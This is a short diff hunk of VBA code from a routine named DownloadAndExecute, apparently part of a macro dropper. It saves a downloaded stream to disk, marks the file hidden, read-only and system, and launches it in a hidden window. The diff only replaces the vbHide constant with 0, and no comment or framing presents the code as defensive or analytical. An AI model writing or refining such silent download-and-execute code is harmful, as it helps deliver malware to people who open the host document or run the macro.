@@ -28,7 +28,7 @@ Private Sub DownloadAndExecute()
             oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
             SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
-            result = Shell(downloadPath, vbHide)
+            result = Shell(downloadPath, 0) ' vbHide = 0
         End If
        
     End If
